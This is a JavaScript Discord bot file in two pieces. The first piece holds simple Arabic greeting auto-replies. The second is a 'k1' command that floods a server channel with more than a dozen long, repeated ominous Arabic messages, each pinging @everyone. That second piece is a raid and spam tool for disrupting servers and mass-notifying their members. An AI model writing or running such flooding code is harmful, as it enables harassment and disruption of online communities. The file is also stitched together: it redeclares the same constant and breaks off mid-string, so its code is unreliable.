const Discord = require('discord.js');
const client = new Discord.Client();




    client.on('message', msg => {
  if (msg.content === 'هلا') {
    msg.reply('هلا والله فيك');
  }
});
client.on('message', msg => {
  if (msg.content === 'سلام عليكم') {
    msg.reply('عليكم السلام مين الحلو السكر هذا الي جا');
  }
});
client.on('message', msg => {
  if (msg.content === 'باك') {
    msg.reply('ولكم');
  }
});
client.on('message', msg => {
  if (msg.content === 'تسلم') {
    msg.reply('الله يسلمك')
  }
});

client.on('message', msg => {
  if (msg.content === 'تسلم يصحبي') {
    msg.reply('الله يسلمك');
  }
});






const Discord = require("discord.js");
const LOka = new Discord.Client();
console.log('mhstr special on');
LOka.on('ready', () => {
  console.log(`Logged in as ${LOka.user.tag} !`);

});

LOka.on('message', message => {
     if (message.content === "k1") {
           if(!message.channel.guild) return;

message.channel.send(`  **
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
@everyone
**`
);
message.channel.send(`  **
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
@everyone
**`
);
message.channel.send(`  **
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
@everyone
**`
);
message.channel.send(`  **
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
@everyone
**`
);
message.channel.send(`  **
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
@everyone
**`
);
message.channel.send(`  **
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
@everyone
**`
);
message.channel.send(`  **
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
@everyone
**`
);
message.channel.send(`  **
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
@everyone
**`
);
message.channel.send(`  **
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
@everyone
**`
);
message.channel.send(`  **
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
@everyone
**`
);
message.channel.send(`  **
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
@everyone
**`
);
message.channel.send(`  **
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
@everyone
**`
);
message.channel.send(`  **
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
@everyone
**`
);
message.channel.send(`  **
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
@everyone
**`
);
message.channel.send(`  **
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
@everyone
**`
);
message.channel.send(`  **
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
@everyone
**`
);
message.channel.send(`  **
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
@everyone
**`
);
message.channel.send(`  **
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
